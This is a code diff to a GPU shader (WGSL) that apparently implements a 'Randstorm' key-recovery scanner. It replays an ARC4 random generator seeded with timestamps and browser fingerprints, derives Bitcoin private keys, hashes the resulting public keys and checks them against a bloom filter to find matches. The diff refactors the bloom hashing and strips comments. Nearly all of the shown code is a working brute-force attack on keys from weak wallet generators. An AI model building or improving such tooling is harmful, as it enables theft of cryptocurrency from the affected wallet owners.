@@ -46,39 +46,15 @@ struct MatchResult {
 @group(0) @binding(4) var<storage, read_write> result_count: array<atomic<u32>>;
 
 // ── Bloom filter check ───────────────────────────────────────
-// FIX C: must probe exactly BLOOM_NUM_HASHES=15 positions using
-// the same double-hashing as Rust's compute_bloom_bits():
-//   h(k,i) = (h1 + i*h2) % n_bits
-// where h1 = murmur(data, SEED), h2 = murmur(data, h1)
-// Bloom filter buffer stores u32 words (little-endian bits)
+// Probes BLOOM_NUM_HASHES=15 positions using double-hashing:
+//   bit_pos(k) = (h1 + k * h2) % n_bits
+// where h1 = murmur3(data, SEED), h2 = murmur3(data, h1)
 const BLOOM_NUM_HASHES: u32 = 15u;
 const BLOOM_HASH_SEED:  u32 = 0x9E3779B9u;
 
-fn murmur3_u32(seed: u32, extra: u32) -> u32 {
-    // Compact MurmurHash3 finalizer over two u32 words (8 bytes representing hash160 slice)
-    // We feed each 20-byte hash160 through a rolling murmur.
-    // For bloom probe: we pass (seed, extra) as a 2-word message.
+// MurmurHash3-style hash of 20-byte hash160 (5 x u32) with given seed
+fn bloom_murmur(seed: u32, a0:u32, a1:u32, a2:u32, a3:u32, a4:u32) -> u32 {
     var h = seed;
-    var k = extra;
-    k = k * 0xCC9E2D51u;
-    k = (k << 15u) | (k >> 17u);
-    k = k * 0x1B873593u;
-    h = h ^ k;
-    h = (h << 13u) | (h >> 19u);
-    h = h * 5u + 0xE6546B64u;
-    h = h ^ 8u;   // length = 8 bytes
-    h = h ^ (h >> 16u);
-    h = h * 0x85EBCA6Bu;
-    h = h ^ (h >> 13u);
-    h = h * 0xC2B2AE35u;
-    h = h ^ (h >> 16u);
-    return h;
-}
-
-// Compute h1 and h2 for a 20-byte hash160 stored as 5 u32s
-fn bloom_h1(a0:u32, a1:u32, a2:u32, a3:u32, a4:u32) -> u32 {
-    var h = BLOOM_HASH_SEED;
-    // Process 5 words (20 bytes) as 4-byte chunks
     var k: u32;
     k = a0 * 0xCC9E2D51u; k = (k<<15u)|(k>>17u); k *= 0x1B873593u;
     h ^= k; h = (h<<13u)|(h>>19u); h = h*5u + 0xE6546B64u;
@@ -95,34 +71,15 @@ fn bloom_h1(a0:u32, a1:u32, a2:u32, a3:u32, a4:u32) -> u32 {
     return h;
 }
 
-fn bloom_h2(h1: u32, a0:u32, a1:u32, a2:u32, a3:u32, a4:u32) -> u32 {
-    // h2 = murmur(data, h1) - same data but different seed
-    var h = h1;
-    var k: u32;
-    k = a0 * 0xCC9E2D51u; k = (k<<15u)|(k>>17u); k *= 0x1B873593u;
-    h ^= k; h = (h<<13u)|(h>>19u); h = h*5u + 0xE6546B64u;
-    k = a1 * 0xCC9E2D51u; k = (k<<15u)|(k>>17u); k *= 0x1B873593u;
-    h ^= k; h = (h<<13u)|(h>>19u); h = h*5u + 0xE6546B64u;
-    k = a2 * 0xCC9E2D51u; k = (k<<15u)|(k>>17u); k *= 0x1B873593u;
-    h ^= k; h = (h<<13u)|(h>>19u); h = h*5u + 0xE6546B64u;
-    k = a3 * 0xCC9E2D51u; k = (k<<15u)|(k>>17u); k *= 0x1B873593u;
-    h ^= k; h = (h<<13u)|(h>>19u); h = h*5u + 0xE6546B64u;
-    k = a4 * 0xCC9E2D51u; k = (k<<15u)|(k>>17u); k *= 0x1B873593u;
-    h ^= k; h = (h<<13u)|(h>>19u); h = h*5u + 0xE6546B64u;
-    h ^= 20u;
-    h ^= (h >> 16u); h *= 0x85EBCA6Bu; h ^= (h >> 13u); h *= 0xC2B2AE35u; h ^= (h >> 16u);
-    return h;
-}
-
 fn bloom_check(h0: u32, h1: u32, h2: u32, h3: u32, h4: u32) -> bool {
-    let n = params.bloom_size * 32u;  // bloom_size is in u32 words, so bits = words * 32
+    let n = params.bloom_size * 32u;  // bloom_size в u32 словах, биты = слова * 32
     if n == 0u { return true; }
-    let bh1 = bloom_h1(h0, h1, h2, h3, h4);
-    let bh2 = bloom_h2(bh1, h0, h1, h2, h3);  // note: h4 not used in h2 seed for compat
+    let bh1 = bloom_murmur(BLOOM_HASH_SEED, h0, h1, h2, h3, h4);
+    let bh2 = bloom_murmur(bh1,            h0, h1, h2, h3, h4);
     for (var k = 0u; k < BLOOM_NUM_HASHES; k++) {
-        let bit_pos = (bh1 + k * bh2) % n;
-        let word_idx = bit_pos >> 5u;      // / 32
-        let bit_off  = bit_pos & 31u;      // % 32
+        let bit_pos  = (bh1 + k * bh2) % n;
+        let word_idx = bit_pos >> 5u;
+        let bit_off  = bit_pos & 31u;
         if ((bloom[word_idx] >> bit_off) & 1u) == 0u { return false; }
     }
     return true;
@@ -696,27 +653,20 @@ fn u256_from_bytes32(b: array<u32, 32>) -> U256 {
     return k;
 }
 
-// privkey → pubkey → hash160
-// FIX B: scalar k is used RAW in double-and-add (not converted to Montgomery).
-// Montgomery form is only for field elements (coordinates), not for the scalar.
 fn privkey_to_hash160(prng_out: array<u32, 32>) -> array<u32, 5> {
-    // Raw scalar from privkey bytes
     let k = u256_from_bytes32(prng_out);
 
-    // G is already in Montgomery form in our constants
     var G: JacPt;
     G.x = u256w(GXM0,GXM1,GXM2,GXM3,GXM4,GXM5,GXM6,GXM7);
     G.y = u256w(GYM0,GYM1,GYM2,GYM3,GYM4,GYM5,GYM6,GYM7);
     G.z = fp_mont1();
 
-    // Double-and-add using raw scalar bits (not Montgomery-converted k)
     var R = jac_inf();
     var i: i32 = 255;
     loop {
         if (i < 0) { break; }
         let wi = u32(i) / 32u;
         let bi = u32(i) % 32u;
-        // FIX B: read bits from raw k, not k_mont
         let bit = (gw(k, 7u - wi) >> bi) & 1u;
         R = jac_dbl(R);
         if (bit == 1u) { R = jac_add(R, G); }
@@ -732,7 +682,6 @@ fn privkey_to_hash160(prng_out: array<u32, 32>) -> array<u32, 5> {
     let Qx = xy[0];
     let Qy = xy[1];
 
-    // Compressed pubkey prefix: 0x02 if Qy even, 0x03 if odd
     let prefix = 2u + (gw(Qy, 7u) & 1u);
 
     let sha_out = sha256_33(
@@ -752,22 +701,14 @@ fn randstorm_main(@builtin(global_invocation_id) gid: vec3<u32>) {
 
     if fp_idx >= params.fp_count { return; }
 
-    // FIX A: compute full u64 timestamp offset to avoid u32 overflow.
-    // Old code: ts_lo = start_ms_lo + ts_idx * interval_ms  <- OVERFLOWS for ts_idx > ~1000
-    // Fix: compute offset as u64 split into hi/lo, then add to start.
+    // u64 timestamp offset (mulhi чтобы не было u32 overflow)
     let offset_lo = ts_idx * params.interval_ms;
-    // carry detection: if offset_lo < ts_idx * interval_ms would overflow, but since
-    // WGSL has no u64, we detect carry by checking if offset_lo < (ts_idx & 0xFFFFu) * params.interval_ms
-    // Simpler: use the fact that carry occurs when ts_idx * interval_ms wraps.
-    // We compute carry = (ts_idx >> 16) * interval_ms + (((ts_idx & 0xFFFFu) * interval_ms) >> 16)
-    //                    >> 16  ... this is equivalent to mulhi(ts_idx, interval_ms)
     let ts_idx_lo16 = ts_idx & 0xFFFFu;
     let ts_idx_hi16 = ts_idx >> 16u;
     let mid = ts_idx_lo16 * (params.interval_ms >> 16u) + ts_idx_hi16 * (params.interval_ms & 0xFFFFu);
     let offset_hi = ts_idx_hi16 * (params.interval_ms >> 16u) + (mid >> 16u) +
                     (((ts_idx_lo16 * (params.interval_ms & 0xFFFFu)) >> 16u) + (mid & 0xFFFFu)) >> 16u;
 
-    // Add offset (hi:lo) to start_ms (hi:lo)
     let ts_lo_raw = params.start_ms_lo + offset_lo;
     let carry     = select(0u, 1u, ts_lo_raw < params.start_ms_lo);
     let ts_lo     = ts_lo_raw;
@@ -775,22 +716,17 @@ fn randstorm_main(@builtin(global_invocation_id) gid: vec3<u32>) {
 
     let fp = fingerprints[fp_idx];
 
-    // ARC4 KSA with fingerprint entropy
     var s: array<u32, 256>;
     arc4_ksa(ts_lo, ts_hi, fp.screen_width, fp.screen_height,
              fp.color_depth, fp.timezone_offset, &s);
 
-    // Generate 32 privkey bytes
     var prng_out: array<u32, 32>;
     arc4_prng(&s, &prng_out);
 
-    // privkey → EC pubkey → Hash160
     let h160 = privkey_to_hash160(prng_out);
 
-    // Bloom filter check
     if !bloom_check(h160[0], h160[1], h160[2], h160[3], h160[4]) { return; }
 
-    // Write result
     let idx = atomicAdd(&result_count[0], 1u);
     if idx < 65536u {
         results[idx].timestamp_lo = ts_lo;
